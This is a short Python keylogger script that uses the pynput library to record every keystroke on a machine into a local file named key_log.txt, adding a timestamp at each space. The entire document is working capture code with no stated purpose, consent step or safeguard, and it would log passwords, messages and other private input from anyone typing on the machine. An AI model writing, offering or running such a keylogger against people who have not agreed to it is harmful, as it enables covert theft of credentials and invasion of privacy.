from pynput import keyboard 
from datetime import datetime


def on_press(key):    
    file = open('key_log.txt', 'a')

    if str(key) == "Key.space":
        file.write(datetime.now().strftime('   %Y-%m-%d, %H:%M:%S'))  
        file.write('\n')       
    else:
        file.write(str(key).replace("'", ''))  
    file.close() 


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()